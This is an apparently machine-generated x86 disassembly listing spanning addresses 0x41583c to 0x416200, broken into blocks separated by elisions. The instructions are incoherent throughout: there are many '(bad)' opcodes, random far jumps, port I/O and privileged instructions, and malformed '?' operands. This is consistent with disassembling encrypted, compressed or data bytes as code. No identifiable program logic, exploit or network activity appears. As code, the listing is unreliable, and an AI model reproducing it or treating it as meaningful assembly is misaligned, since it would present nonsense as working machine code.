  41583c:	repnz gs inc ecx
  41583f:	and    ah,0x45
  415842:	retf   0x4670
  415845:	test   DWORD PTR [ecx-0x5d],0x1b0801f5
  41584c:	pop    ecx
  41584d:	pop    ebx
  41584e:	sahf   
  41584f:	mov    WORD PTR [edi],gs
  415851:	ss (bad) 
  415853:	lds    ecx,FWORD PTR [ebx-0x374dc710]
  415859:	iret   
  41585a:	je     0x4158d4
  41585c:	xchg   BYTE PTR [eax-0x2c],cl
  41585f:	jecxz  0x415890
  415861:	call   0x2de15f08
  415866:	mov    cl,BYTE PTR [eax-0x37]
  415869:	test   bl,ah
  41586b:	xor    edi,DWORD PTR [eax+0x44]
  41586e:	mov    ebx,0xafb9add3
  415873:	cmc    
  415874:	hlt    
  415875:	pop    edx
  415876:	fisttp QWORD PTR [esi+0x3428c62f]
  41587c:	fiadd  DWORD PTR [edx]
  41587e:	mov    eax,0x82d83b38
  415883:	sbb    bl,cl
  415885:	pop    ebx
  415886:	or     BYTE PTR [eax+ecx*8-0x588c2d64],0xdf
  41588e:	mov    bl,0xdc
  415890:	or     al,0x62
  415892:	or     DWORD PTR [edi+0x100aab3],ecx
  415898:	stos   BYTE PTR es:[edi],al
  415899:	xor    DWORD PTR [eax+0x79496df1],esp
  41589f:	mov    esi,0x387eee19
  4158a4:	xlat   BYTE PTR ds:[ebx]
  4158a5:	ficom  DWORD PTR [edi]
  4158a7:	jae    0x4158ef
  4158a9:	out    dx,al
  4158aa:	adc    eax,0xc150d4fa
  4158af:	sbb    ebp,DWORD PTR [esi]
  4158b1:	mov    cl,0x6d
  4158b3:	push   cs
  4158b4:	jmp    0x41589e
  4158b6:	ins    DWORD PTR es:[edi],dx
  4158b7:	ret    
  4158b8:	bound  ecx,QWORD PTR ds:[edx-0x39]
  4158bc:	xchg   esi,eax
  4158bd:	jo     0x41592b
  4158bf:	xchg   ecx,eax
  4158c0:	rcr    DWORD PTR [ebp-0x54],1
  4158c3:	paddusw mm2,QWORD PTR [eax]
  4158c6:	dec    esi
  4158c7:	mov    gs,WORD PTR [edi+0x107af789]
  4158cd:	push   edx
  4158ce:	dec    ebx
  4158cf:	int    0x2d
  4158d1:	inc    esp
  4158d2:	xlat   BYTE PTR ds:[ebx]
  4158d3:	ds pushf 
  4158d5:	sbb    dh,0x71
  4158d8:	sar    BYTE PTR [esi+0x29],cl
  4158db:	push   0xffffffec
  4158dd:	scas   al,BYTE PTR es:[edi]
  4158de:	dec    esi
  4158df:	push   ebx
  4158e0:	and    al,BYTE PTR [ebp-0xd6e6a82]
  4158e6:	jmp    0xf706:0x80602b6f
  4158ed:	jb     0x4158d1
  4158ef:	pop    ds
  4158f0:	repnz dec edi
  4158f2:	pusha  
  4158f3:	adc    al,0x63
  4158f5:	sar    bl,1
  4158f7:	pop    ebx
  4158f8:	cmp    edx,DWORD PTR [eax+0x7a]
  4158fb:	push   ebp
  4158fc:	dec    ecx
  4158fd:	or     BYTE PTR [edi-0x6c],0xc4
  415901:	pop    ds
  415902:	lods   eax,DWORD PTR ds:[esi]
  415903:	mov    bh,0x65
  415905:	enter  0xcb17,0x44
  415909:	lds    esi,FWORD PTR ds:0xaf34cc8e
  41590f:	jo     0x4158e4
  415911:	push   ecx
  415912:	mov    cl,BYTE PTR [ecx]
  415914:	sti    
  415915:	xor    al,0x90
  415917:	iret   
  415918:	loope  0x415980
  41591a:	and    bh,BYTE PTR [edx+0xe3536ab]
  415920:	pop    ebx
  415921:	jecxz  0x4158fe
  415923:	add    BYTE PTR [edi+0x3d],cl
  415926:	jp     0x415964
  415928:	inc    ecx
  415929:	retf   
  41592a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41592b:	js     0x4158bb
  41592d:	push   edx
  41592e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41592f:	stos   DWORD PTR es:[edi],eax
  415930:	neg    DWORD PTR [ecx]
  415932:	(bad)  
  415933:	lahf   
  415934:	push   cs
	...
  415995:	add    BYTE PTR [ebp-0x78],al
  415998:	sub    al,0x77
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0x6d
  4159a3:	enter  0x154c,0x6b
  4159a7:	loope  0x4159a9
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [edx],ch
  4159af:	add    al,0x11
  4159b1:	std    
  4159b2:	lock fmul QWORD PTR [ecx+0x10c8dab4]
  4159b9:	jmp    0x2193bc94
  4159be:	jb     0x415a39
  4159c0:	adc    bl,BYTE PTR [esi-0x24]
  4159c3:	aas    
  4159c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c5:	mov    dl,ch
  4159c7:	pushf  
  4159c8:	mov    esi,0x46ad8cc4
  4159cd:	pop    ss
  4159ce:	(bad)  [esi+0x3e635ff9]
  4159d4:	jb     0x4159ac
  4159d6:	xchg   edx,eax
  4159d7:	push   esp
  4159d8:	test   al,0xc9
  4159da:	ds aas 
  4159dc:	mov    al,0x6e
  4159de:	xchg   ecx,eax
  4159df:	sbb    al,0xb8
  4159e1:	std    
  4159e2:	add    BYTE PTR ds:0xd8d5d19,al
  4159e8:	test   BYTE PTR [esi-0x5aac7859],dh
  4159ee:	pusha  
  4159ef:	push   0xb240b48b
  4159f4:	sub    DWORD PTR [edx],esi
  4159f6:	xor    edi,DWORD PTR [ecx]
  4159f8:	cmp    dl,0xbc
  4159fb:	outs   dx,BYTE PTR ds:[esi]
  4159fc:	jo     0x415a3b
  4159fe:	aad    0xcf
  415a00:	xchg   esi,eax
  415a01:	call   DWORD PTR [ebx]
  415a03:	or     DWORD PTR [ebx+0x3ea21edc],ecx
  415a09:	push   ebx
  415a0a:	adc    eax,0x855b3fdf
  415a0f:	pop    eax
  415a10:	sbb    cl,dl
  415a12:	adc    DWORD PTR [edi+ebx*1],0xdfbe738a
  415a19:	std    
  415a1a:	sbb    ebx,eax
  415a1c:	xchg   ebp,eax
  415a1d:	jmp    0xb54d:0xc75889dc
  415a24:	pop    edx
  415a25:	mov    eax,0xc8f7f40b
  415a2a:	(bad)  
  415a2b:	sub    DWORD PTR [edi],eax
  415a2d:	cmp    DWORD PTR [ebp+0x6e],esp
  415a30:	add    al,0xf1
  415a32:	ja     0x4159f2
  415a34:	fstp   DWORD PTR [ebx]
  415a36:	inc    eax
  415a37:	fld    QWORD PTR ss:[esi-0xc]
  415a3b:	mov    WORD PTR [esi+eax*4-0x6c],fs
  415a3f:	lods   al,BYTE PTR ds:[esi]
  415a40:	outs   dx,BYTE PTR ds:[esi]
  415a41:	imul   esp,DWORD PTR [edx-0x39843fe7],0xbaed1269
  415a4b:	mov    WORD PTR [edi+0x26],fs
  415a4e:	sbb    DWORD PTR ds:0xfc4b31e9,ebx
  415a54:	xchg   ecx,eax
  415a55:	stos   DWORD PTR es:[edi],eax
  415a56:	mov    eax,ds:0xa9f21b31
  415a5b:	cwde   
  415a5c:	popa   
  415a5d:	(bad)  
  415a5e:	dec    BYTE PTR [esi+0x12cf737]
  415a64:	push   eax
  415a65:	ret    
  415a66:	mov    esi,0x8813d5d0
  415a6b:	imul   ebp,edi,0x7c98a36a
  415a71:	pusha  
  415a72:	dec    DWORD PTR [eax]
  415a74:	in     al,0x79
  415a76:	call   0xf2c0:0x8df3c5ba
  415a7d:	xchg   esp,eax
  415a7e:	call   0xed7f774b
  415a83:	fs ins BYTE PTR es:[edi],dx
  415a85:	fnstenv [ebp+0x17d7262c]
  415a8b:	add    al,0x49
  415a8d:	(bad)  
  415a8e:	in     eax,0x52
  415a90:	jg     0x415ac3
  415a92:	push   0xc12c5272
  415a97:	pop    esi
  415a98:	call   0x3ce8909
  415a9d:	jecxz  0x415afb
  415a9f:	jae    0x415a3f
  415aa1:	and    ah,bl
  415aa3:	sub    DWORD PTR [ecx+0x6e],ecx
  415aa6:	mov    ds:0xf5744bc0,eax
  415aab:	push   ecx
  415aac:	(bad)  
  415aad:	enter  0x2b0f,0xa2
  415ab1:	jo     0x415aef
  415ab3:	push   eax
  415ab4:	ins    BYTE PTR es:[edi],dx
	...
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0xa7aa4de
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [ebx],dh
  415b2f:	and    ah,BYTE PTR [edx-0x651e468b]
  415b35:	(bad)  
  415b36:	sbb    BYTE PTR [edi+0x2812f457],0xa7
  415b3d:	ror    BYTE PTR [edx],cl
  415b3f:	cmp    al,0x33
  415b41:	jno    0x415ba4
  415b43:	push   es
  415b44:	mov    bl,0x18
  415b46:	outs   dx,BYTE PTR ds:[esi]
  415b47:	mov    ?,WORD PTR [ebp+0x11488b5d]
  415b4d:	sbb    ah,BYTE PTR [edx+0x78]
  415b50:	mov    ebx,0x8704d85a
  415b55:	dec    ecx
  415b56:	or     eax,0xe6bf5b7a
  415b5b:	rol    ch,1
  415b5d:	push   es
  415b5e:	mov    ds:0x9d71ee08,eax
  415b63:	push   edx
  415b64:	add    ch,BYTE PTR [ecx]
  415b66:	or     edi,DWORD PTR [ecx]
  415b68:	xor    ecx,esp
  415b6a:	repz fs ss cwde 
  415b6e:	ss inc eax
  415b70:	jnp    0x415bad
  415b72:	icebp  
  415b73:	cld    
  415b74:	sbb    ch,BYTE PTR [ebx-0x5b]
  415b77:	mov    DWORD PTR [ebx-0x46a17da],edx
  415b7d:	pushf  
  415b7e:	sbb    esp,DWORD PTR [ebp-0x1a2d10bf]
  415b84:	fst    QWORD PTR [edi+0x7a]
  415b87:	jp     0x415b25
  415b89:	popa   
  415b8a:	ret    0xfba1
  415b8d:	mul    BYTE PTR [eax+edx*4]
  415b90:	jg     0x415b1a
  415b92:	loopne 0x415b67
  415b94:	mov    ch,0x32
  415b96:	fist   WORD PTR [esi-0x64]
  415b99:	push   0x48
  415b9b:	mov    ch,0xb1
  415b9d:	push   esi
  415b9e:	in     al,0xc
  415ba0:	mov    al,0xd3
  415ba2:	mov    ebx,0xdbba341c
  415ba7:	dec    ebx
  415ba8:	inc    edx
  415ba9:	dec    edx
  415baa:	idiv   eax
  415bac:	inc    esp
  415bad:	ret    
  415bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415baf:	bound  edi,QWORD PTR [eax-0x1c415d06]
  415bb5:	dec    esi
  415bb6:	rcl    DWORD PTR [edi],cl
  415bb8:	dec    edi
  415bb9:	lock jne 0x415bf7
  415bbc:	mov    ecx,0x8f46dd2f
  415bc1:	pop    ebp
  415bc2:	into   
  415bc3:	sbb    eax,0x46aac402
  415bc8:	inc    edi
  415bc9:	xlat   BYTE PTR ds:[ebx]
  415bca:	xchg   ecx,eax
  415bcb:	and    BYTE PTR fs:[ecx],ch
  415bce:	mov    DWORD PTR ds:0x48ee829a,edi
  415bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd5:	mov    ebp,0x995686ea
  415bda:	sbb    esp,DWORD PTR [ecx]
  415bdc:	inc    edi
  415bdd:	or     cl,BYTE PTR [ebp+0x3ec9e457]
  415be3:	out    dx,al
  415be4:	add    eax,0x25864a60
  415be9:	lahf   
  415bea:	call   0x2f416306
  415bef:	xor    ecx,esi
  415bf1:	jns    0x415be5
  415bf3:	xor    al,0x45
  415bf5:	xchg   BYTE PTR [ebp+0x184c6323],ch
  415bfb:	test   al,0x31
  415bfd:	retf   
  415bfe:	shl    DWORD PTR [ecx],cl
  415c00:	stos   DWORD PTR es:[edi],eax
  415c01:	popa   
  415c02:	es cmc 
  415c04:	xchg   edx,eax
  415c05:	and    bl,BYTE PTR [edi]
  415c07:	and    cl,BYTE PTR [esi]
  415c09:	push   esi
  415c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0b:	sub    ebp,DWORD PTR [ecx]
  415c0d:	rol    BYTE PTR [edi],cl
  415c0f:	jg     0x415c12
  415c11:	cmc    
  415c12:	int    0x76
  415c14:	mov    ch,0x52
  415c16:	jmp    0x7a2c4b62
  415c1b:	mov    edx,0x21c3be8a
  415c20:	or     bh,BYTE PTR [esi+0x2b]
  415c23:	dec    eax
  415c24:	xor    eax,0xa05e33e7
  415c29:	push   ss
  415c2a:	sbb    edx,ecx
  415c2c:	cmp    eax,0x1dff137c
  415c31:	fist   DWORD PTR [ebp+0x8c67]
	...
  415c93:	add    BYTE PTR [eax],al
  415c95:	add    BYTE PTR [edx],bh
  415c97:	adc    BYTE PTR [edi-0x444040c4],bh
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0x5795240f
  415ca5:	dec    ecx
  415ca6:	jns    0x415c8b
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    ah,al
  415caf:	dec    ecx
  415cb0:	add    ah,BYTE PTR [ecx+0x52d5de10]
  415cb6:	jae    0x415c3c
  415cb8:	dec    edi
  415cb9:	pop    esp
  415cba:	sar    DWORD PTR [edi+0x25],1
  415cbd:	aas    
  415cbe:	adc    bl,BYTE PTR [ecx]
  415cc0:	inc    ebx
  415cc1:	cmp    eax,0xc824a30c
  415cc6:	pop    ss
  415cc7:	mov    WORD PTR [edi],ds
  415cc9:	pop    eax
  415cca:	out    0x4b,al
  415ccc:	(bad)  
  415ccd:	in     al,0xc
  415ccf:	aad    0x6b
  415cd1:	jno    0x415cbe
  415cd3:	adc    eax,0x6a621820
  415cd8:	mov    edx,0xae2261a1
  415cdd:	ins    BYTE PTR es:[edi],dx
  415cde:	fidivr DWORD PTR [edi-0x9fe067b]
  415ce4:	or     eax,0x7cbba902
  415ce9:	sub    eax,0x259babe0
  415cee:	(bad)  
  415cef:	pop    edi
  415cf0:	retf   
  415cf1:	aam    0xdc
  415cf3:	jge    0x415d2f
  415cf5:	inc    edx
  415cf6:	pop    eax
  415cf7:	lods   al,BYTE PTR ds:[esi]
  415cf8:	sbb    cl,BYTE PTR [ebx+0x7]
  415cfb:	out    dx,eax
  415cfc:	jmp    0xef997eb
  415d01:	mov    ebp,0xa3c8e51a
  415d06:	and    dh,BYTE PTR [ecx-0x2d]
  415d09:	hlt    
  415d0a:	fsubr  DWORD PTR fs:[eax+0x6dcf4b46]
  415d11:	cwde   
  415d12:	imul   ebp,edx,0x36
  415d15:	push   esp
  415d16:	cld    
  415d17:	fldcw  WORD PTR [edi-0x10]
  415d1a:	jmp    FWORD PTR [ecx+0x17]
  415d1d:	jmp    0xb25c:0xee0cc111
  415d24:	pushf  
  415d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d26:	enter  0x2635,0x3d
  415d2a:	jg     0x415da8
  415d2c:	in     eax,dx
  415d2d:	cmc    
  415d2e:	(bad)
  415d32:	in     eax,0x3f
  415d34:	cmc    
  415d35:	push   0xffffffd6
  415d37:	sbb    esi,edx
  415d39:	data16 loope 0x415d3f
  415d3c:	cld    
  415d3d:	push   ss
  415d3e:	repz rcl BYTE PTR [ebx],cl
  415d41:	jp     0x415cdb
  415d43:	(bad)  
  415d44:	and    al,0x5f
  415d46:	cmc    
  415d47:	cmp    eax,0x76e83c43
  415d4c:	fld    TBYTE PTR [ecx-0x127c0bbd]
  415d52:	in     eax,dx
  415d53:	dec    edx
  415d54:	call   0x4b6d:0x1f8ed413
  415d5b:	rol    edx,cl
  415d5d:	rcl    BYTE PTR [bx+0x7501],1
  415d62:	(bad)  
  415d63:	sbb    eax,0xb107199c
  415d68:	gs pop edi
  415d6a:	pop    eax
  415d6b:	xchg   ebx,esi
  415d6d:	stc    
  415d6e:	mov    ebp,0xd9acba3d
  415d73:	fs mov eax,0x36077fcc
  415d79:	xor    eax,0xc78e24ef
  415d7e:	push   ss
  415d7f:	cmp    esp,DWORD PTR [eax+0x60]
  415d82:	pusha  
  415d83:	test   eax,0xac8ef7ff
  415d88:	inc    edx
  415d89:	cmp    bh,al
  415d8b:	cdq    
  415d8c:	mov    al,0xfb
  415d8e:	jl     0x415d62
  415d90:	inc    edi
  415d91:	je     0x415d2a
  415d93:	mov    ebp,0x1c7e3633
  415d98:	mov    gs,WORD PTR [esi-0x2844f62e]
  415d9e:	add    BYTE PTR [ebp-0x5],dl
  415da1:	(bad)  
  415da2:	and    esp,DWORD PTR [ebp+0xfc47cc]
  415da8:	mov    eax,0x6b2015a5
  415dad:	and    eax,DWORD PTR [ebp+ebx*8-0x2877dfc]
  415db4:	adc    al,0x0
	...
  415e16:	out    dx,al
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0xb6545606
  415e24:	inc    eax
  415e25:	sbb    eax,0xe480
  415e2a:	pop    es
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [eax],dh
  415e2f:	xor    DWORD PTR [eax],ecx
  415e31:	and    DWORD PTR [ecx],ebp
  415e33:	push   ecx
  415e34:	push   ss
  415e35:	or     BYTE PTR [ebp+0x1c],dh
  415e38:	sub    al,0xb5
  415e3a:	repnz dec ecx
  415e3c:	push   esp
  415e3d:	adc    al,0x17
  415e3f:	and    eax,0xbd4d1a1a
  415e44:	neg    edx
  415e46:	outs   dx,DWORD PTR ds:[esi]
  415e47:	xor    BYTE PTR [edx],bl
  415e49:	daa    
  415e4a:	add    eax,DWORD PTR [eax-0x4a]
  415e4d:	mov    WORD PTR [edx-0x5d9f33b2],?
  415e53:	ror    BYTE PTR [edi-0x8],cl
  415e56:	out    dx,eax
  415e57:	cmp    DWORD PTR [edx],esp
  415e59:	pop    es
  415e5a:	or     DWORD PTR [bp+di-0x6737],0x2b20dd86
  415e63:	push   ss
  415e64:	das    
  415e65:	add    DWORD PTR [eax+edx*8+0x12],0xaefe38f6
  415e6d:	inc    eax
  415e6e:	scas   eax,DWORD PTR es:[edi]
  415e6f:	out    dx,eax
  415e70:	pushf  
  415e71:	leave  
  415e72:	pusha  
  415e73:	outs   dx,DWORD PTR ds:[esi]
  415e74:	push   ss
  415e75:	in     al,0x7b
  415e77:	imul   edx,DWORD PTR [esi],0x573fbc21
  415e7d:	outs   dx,BYTE PTR ds:[esi]
  415e7e:	cmp    ecx,esp
  415e80:	mov    bl,0x8f
  415e82:	xor    ecx,ecx
  415e84:	cmc    
  415e85:	pop    ebp
  415e86:	js     0x415e6a
  415e88:	mov    bl,0x19
  415e8a:	sub    ecx,DWORD PTR [eax+edi*4]
  415e8d:	popa   
  415e8e:	cli    
  415e8f:	aaa    
  415e90:	imul   ch
  415e92:	xor    cl,BYTE PTR [ebx]
  415e94:	push   ebx
  415e95:	lea    ebp,[esi+0xe524608]
  415e9b:	outs   dx,DWORD PTR ds:[esi]
  415e9c:	push   ds
  415e9d:	push   cs
  415e9e:	mov    esp,eax
  415ea0:	into   
  415ea1:	sbb    cl,BYTE PTR [ebp-0x74]
  415ea4:	pop    ecx
  415ea5:	(bad)  
  415ea6:	cdq    
  415ea7:	(bad)  
  415ea8:	in     eax,0x43
  415eaa:	sub    edi,DWORD PTR [ecx-0x5f]
  415ead:	aas    
  415eae:	icebp  
  415eaf:	popf   
  415eb0:	pop    ecx
  415eb1:	aam    0xf4
  415eb3:	xchg   BYTE PTR [edi-0x1a],al
  415eb6:	cli    
  415eb7:	imul   esp,DWORD PTR [edx],0x13aacee3
  415ebd:	std    
  415ebe:	mov    ecx,0xa003b0fa
  415ec3:	jae    0x415e73
  415ec5:	push   edx
  415ec6:	je     0x415f21
  415ec8:	sbb    DWORD PTR [esi-0x5d97ad67],eax
  415ece:	jns    0x415e70
  415ed0:	pop    esi
  415ed1:	mov    al,0x1
  415ed3:	out    0xbe,al
  415ed5:	mov    al,0x20
  415ed7:	mov    BYTE PTR ds:0x81746f45,cl
  415edd:	push   esi
  415ede:	mov    eax,0x6b71bdf3
  415ee3:	pop    edi
  415ee4:	or     eax,esp
  415ee6:	xchg   ebx,eax
  415ee7:	ins    BYTE PTR es:[edi],dx
  415ee8:	dec    edi
  415ee9:	sub    eax,0x33520128
  415eee:	hlt    
  415eef:	cwde   
  415ef0:	cdq    
  415ef1:	mov    esi,0x3fb9f9f3
  415ef6:	out    dx,al
  415ef7:	sub    al,0xe9
  415ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415efa:	les    ebx,FWORD PTR [edi+0x3b06a328]
  415f00:	xchg   DWORD PTR ds:0xd216a398,esp
  415f06:	adc    DWORD PTR [ebp+0x5b],0x67e8b175
  415f0d:	iret   
  415f0e:	push   0xfa37d3a5
  415f13:	adc    ebx,DWORD PTR [eax+0x1a]
  415f16:	cmp    DWORD PTR [edx+0x72],ecx
  415f19:	idiv   sp
  415f1c:	ins    BYTE PTR es:[edi],dx
  415f1d:	cmp    esi,DWORD PTR [ecx]
  415f1f:	out    dx,eax
  415f20:	je     0x415f9d
  415f22:	loop   0x415f45
  415f24:	out    dx,al
  415f25:	arpl   WORD PTR [esi+0x4ac6e205],si
  415f2b:	leave  
  415f2c:	cmp    ecx,DWORD PTR [eax]
  415f2e:	clc    
  415f2f:	int    0x3a
  415f31:	aam    0xd4
  415f33:	dec    ecx
  415f34:	sbb    eax,0x0
	...
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	cmc    
  415fa3:	iret   
  415fa4:	pop    ecx
  415fa5:	daa    
  415fa6:	xchg   ebp,esp
  415fa8:	add    BYTE PTR [eax],al
  415faa:	pop    es
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [eax],ah
  415faf:	addr16 nop
  415fb1:	sub    eax,0x86127dd8
  415fb6:	inc    esi
  415fb7:	iret   
  415fb8:	nop
  415fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fba:	dec    esi
  415fbb:	or     eax,0xfd45df15
  415fc0:	and    BYTE PTR [ebx],ch
  415fc2:	dec    eax
  415fc3:	xchg   esp,eax
  415fc4:	mov    bh,0xa8
  415fc6:	nop
  415fc7:	js     0x415fd0
  415fc9:	rcr    BYTE PTR [ebx-0x77],0x29
  415fcd:	inc    edi
  415fcf:	out    dx,al
  415fd0:	pop    eax
  415fd1:	(bad)  
  415fd3:	or     al,dh
  415fd5:	jecxz  0x416009
  415fd7:	aaa    
  415fd8:	sbb    edi,edi
  415fda:	jecxz  0x415fc0
  415fdc:	not    BYTE PTR [ebp+0x360a2a91]
  415fe2:	adc    eax,0xd78cf703
  415fe7:	sub    DWORD PTR [edx+eax*2-0x4fc1c5e3],esp
  415fee:	and    ecx,esi
  415ff0:	mov    bl,0x19
  415ff2:	vandpd ymm1,ymm4,YMMWORD PTR [edx+0x6c]
  415ff7:	add    al,bh
  415ff9:	leave  
  415ffa:	dec    esp
  415ffb:	lock lods al,BYTE PTR ds:[esi]
  415ffd:	aam    0xb6
  415fff:	repz les ebp,FWORD PTR [ebp+0xb12d1ce]
  416006:	fldcw  WORD PTR [esi-0x13]
  416009:	push   cs
  41600a:	fwait
  41600b:	outs   dx,BYTE PTR ds:[esi]
  41600c:	pop    ebp
  41600d:	push   ds
  41600e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600f:	mov    bh,0x9b
  416011:	or     al,0xb4
  416013:	and    eax,DWORD PTR [edi+0x1b24e1cd]
  416019:	psrad  mm1,QWORD PTR [ebx-0x7a]
  41601d:	ret    
  41601e:	and    dh,0x71
  416021:	inc    ebx
  416022:	sbb    eax,DWORD PTR [edx]
  416024:	jo     0x415fca
  416026:	ffreep st(6)
  416028:	push   ds
  416029:	ffree  st(1)
  41602b:	fisttp DWORD PTR [edx-0x6323396a]
  416031:	stos   BYTE PTR es:[edi],al
  416032:	pop    eax
  416033:	cmp    BYTE PTR [edx+0x3c0a7ee7],bh
  416039:	sub    DWORD PTR [ecx],edi
  41603b:	xchg   edx,eax
  41603c:	adc    DWORD PTR [esi-0x60bc2fc0],esi
  416042:	int3   
  416043:	dec    ebx
  416044:	sbb    DWORD PTR [ebp-0xb4ad346],eax
  41604a:	push   0x6906141e
  41604f:	adc    al,0xd9
  416051:	push   0x5897c120
  416056:	jmp    0x58f7:0xb9779ba
  41605d:	inc    eax
  41605e:	and    bl,BYTE PTR [edi+0x65d9eb9a]
  416064:	stos   BYTE PTR es:[edi],al
  416065:	mov    ds:0xb8cd5da0,eax
  41606a:	push   ds
  41606b:	push   esp
  41606c:	ds (bad) 
  41606e:	sbb    DWORD PTR [ebp-0x42f30561],edi
  416074:	mov    esi,0x26ca4787
  416079:	cwde   
  41607a:	jnp    0x416096
  41607c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41607d:	inc    ebx
  41607e:	cmp    edi,DWORD PTR [esi+0x2cd6ce91]
  416084:	lock jno 0x4160d4
  416087:	sub    ebp,DWORD PTR [edx]
  416089:	mov    al,0x55
  41608b:	mov    DWORD PTR [eax-0x5f],ebp
  41608e:	ror    DWORD PTR [esi-0x19],cl
  416091:	std    
  416092:	fsub   QWORD PTR [ecx-0x2bc61a0d]
  416098:	rcr    ah,1
  41609a:	ror    DWORD PTR [ebx-0x4c],0xd2
  41609e:	lods   al,BYTE PTR ds:[esi]
  41609f:	hlt    
  4160a0:	mov    fs,WORD PTR [eax-0x5c07f31b]
  4160a6:	out    dx,eax
  4160a7:	aas    
  4160a8:	xchg   esp,eax
  4160a9:	neg    ebx
  4160ab:	mov    ch,0x85
  4160ad:	fsubr  QWORD PTR [ebx+0x1a6bec0b]
  4160b3:	or     eax,edi
	...
  416115:	add    BYTE PTR [eax],ah
  416117:	jmp    0xdf3d3f57
  41611c:	in     eax,0xff
  41611e:	and    bl,BYTE PTR [ebx+0x51751187]
  416124:	xchg   edi,eax
  416125:	sub    ecx,DWORD PTR [esi+0x70000e6]
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [edx-0x6c914664],bh
  416133:	dec    ecx
  416134:	push   ds
  416135:	jne    0x41618b
  416137:	pop    edi
  416138:	fs pop esi
  41613a:	(bad)  
  41613b:	out    dx,al
  41613c:	and    DWORD PTR [esi+esi*8],edx
  41613f:	mov    bl,0x51
  416141:	mov    eax,ds:0x8c5396e6
  416146:	scas   eax,DWORD PTR es:[edi]
  416147:	or     DWORD PTR [ebx],ebp
  416149:	jl     0x41618e
  41614b:	gs sbb ebx,ebp
  41614e:	cmp    dh,BYTE PTR [ebx+0x0]
  416151:	loope  0x416116
  416153:	and    edi,esi
  416155:	add    al,0xb7
  416157:	or     al,0xd9
  416159:	fsubr  QWORD PTR [esi]
  41615b:	xor    edx,DWORD PTR ss:[edx-0x6845c2f2]
  416162:	xchg   DWORD PTR [ebx],esp
  416164:	and    eax,DWORD PTR [esi+0x3e]
  416167:	retf   
  416168:	loop   0x4161d3
  41616a:	jge    0x4161cd
  41616c:	loope  0x416138
  41616e:	in     al,0xed
  416170:	in     eax,dx
  416171:	push   ebp
  416172:	vfnmadd231pd xmm2{k6}{z},xmm6,QWORD PTR [ebx-0x130]{1to2}
  416179:	icebp  
  41617a:	xchg   esp,eax
  41617b:	xchg   ebp,eax
  41617c:	and    BYTE PTR [edx+0x5838a021],0xde
  416183:	sbb    ebx,edx
  416185:	jns    0x4161b4
  416187:	push   esp
  416188:	(bad)  
  416189:	ins    DWORD PTR es:[edi],dx
  41618a:	jo     0x41611b
  41618c:	std    
  41618d:	mov    esp,0x4a50b8ec
  416192:	lods   eax,DWORD PTR ds:[esi]
  416193:	cmp    ebx,DWORD PTR ds:0xeee9e269
  416199:	ins    BYTE PTR es:[edi],dx
  41619a:	and    BYTE PTR [eax],ch
  41619c:	xor    esi,edi
  41619e:	jle    0x416188
  4161a0:	fwait
  4161a1:	(bad)  
  4161a2:	lods   eax,DWORD PTR ds:[esi]
  4161a3:	in     eax,dx
  4161a4:	push   eax
  4161a5:	adc    esp,DWORD PTR [esi+0x116cdf7]
  4161ab:	sbb    BYTE PTR [edi+ebp*2-0x55],ch
  4161af:	popa   
  4161b0:	push   ebx
  4161b1:	aas    
  4161b2:	lahf   
  4161b3:	addr16 addr16 xchg esp,eax
  4161b6:	xchg   DWORD PTR [edx+0x1a],ecx
  4161b9:	push   ss
  4161ba:	push   es
  4161bb:	dec    ecx
  4161bc:	ret    0x19bd
  4161bf:	adc    edi,DWORD PTR [ecx+ebx*1+0x5ac6ce68]
  4161c6:	ins    DWORD PTR es:[edi],dx
  4161c7:	ret    
  4161c8:	mov    ds:0xb6d6cbd8,eax
  4161cd:	push   esp
  4161ce:	sub    ebx,DWORD PTR [eax-0x51]
  4161d1:	cmp    bl,bh
  4161d3:	cmp    BYTE PTR [eax-0x23b91d81],bl
  4161d9:	jmp    0x4161a0
  4161db:	inc    esp
  4161dc:	sub    al,0xfd
  4161de:	mov    eax,0xf1873fc0
  4161e3:	retf   
  4161e4:	sub    ecx,DWORD PTR [ebx-0x1b]
  4161e7:	mov    ch,0xf6
  4161e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ea:	push   ecx
  4161eb:	push   0x7b2e53c5
  4161f0:	ret    
  4161f1:	sub    ah,BYTE PTR [ebp+0x56]
  4161f4:	xchg   edx,eax
  4161f5:	and    BYTE PTR [edx+0x4a793bb1],dh
  4161fb:	push   ebp
  4161fc:	sub    al,0x5b
  4161fe:	scas   eax,DWORD PTR es:[edi]
  4161ff:	int3   
  416200:	sub    bl,ch
